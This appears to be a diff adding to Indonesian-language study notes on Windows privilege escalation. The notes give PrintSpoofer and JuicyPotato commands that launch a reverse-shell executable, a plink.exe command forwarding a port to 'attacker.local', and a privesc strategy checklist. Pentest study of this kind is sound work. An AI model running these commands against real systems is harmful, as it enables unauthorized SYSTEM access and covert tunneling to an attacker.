@@ -741,6 +741,11 @@ Cek di https://github.com/itm4n/PrintSpoofer/releases
 Perintah untuk menjalankan exploit
 ```PrintSpoofer64.exe -i -c cmd```
 
+atau bisa juga seperti ini
+```
+PrintSpoofer64.exe -i -c "C:\Temp\Reverse.exe"
+```
+
 ### Juicy Potato
 Pada Windows terdapat user dengan privilege services. User ini tidak bisa login, karena dia hanya bertugas untuk menjalankan tugas / service misal apache, mssql dll. Terdapat celah keamanan ketika user service ini memiliki privileges `SeImpersonatePrivilege`  atau `SeAssignPrimaryToken`dimana bisa melakukan token impersonate. 
 
@@ -763,3 +768,32 @@ Penjelasan
 .\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
 ```
 
+## Port Fowarding
+Terkadang ada exploit yang mudah ditemukan namun program yang ingin kita exploit itu berjalan di local system (hanya bisa diakses local). Dalam hal ini kita perlu melakukan **port forwarding**. 
+
+Dalam kasus ini kita perlu mem-forward port pada attacker machine ke internal port yang ada di windows
+
+kita bisa menggunakan tool `plink.exe`
+```
+.\plink.exe root@attacker.local -R 445:127.0.0.1:445
+
+```
+Perintah diatas berfungsi untuk port forwarding dari 445 attacker machine ke port 445 target machine
+
+## getsystem (Named pipes & token duplication)
+
+## Priv Esc Strategy
+1. Cek user kita saat ini dengan perintah `whoami` dan juga groups `net user <username>`
+2. Jalankan winpeas dengan argument `fast` , `searchfast`, dan `cmd`
+3. Jalankan tool `seatbelt.exe` dan script lainnya diatas
+4. Jika script/exploit kita gagal dan bingung mau ngapain lagi, coba baca manual command di link berikut. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+5. Deep Dive, jangan menyerah, baca semua hasil dari enumeration
+6. Jika winpeas atau tools lainnya menemukan sesuatu, jangan lupa dicatat
+7. Buat checklist untuk priv esc
+8. Lihat file di direktori umum seperi `Desktop`, `Documents`, `C:\`, `C:\Users`, `C:\Program Files` dan lain-lain
+9. Jika menemukan file yang menarik, cari informasinya lebih lanjut
+10. Coba sesuatu yang tidak sulit seperti registry,exploit,services dan lain-lain
+11. Lihat process yang dijalankan oleh admin, lihat versinya dan cari exploitnya
+12. Cek internal port, mungkin ada sesuatu yang menarik, kita bisa forward portnya  menggunakan `plink.exe` agar bisa diakses dari attacker machine
+13. Jika masih belum bisa nemu priv esc ke admin, coba baca lagi hasil enumeration dan coba pahami lagi mungkin ada yang menarik, cek nama yang mungkin tidak familiar di windows, jika masih belum bisa juga, coba kernel exploits
+14. Don't panic
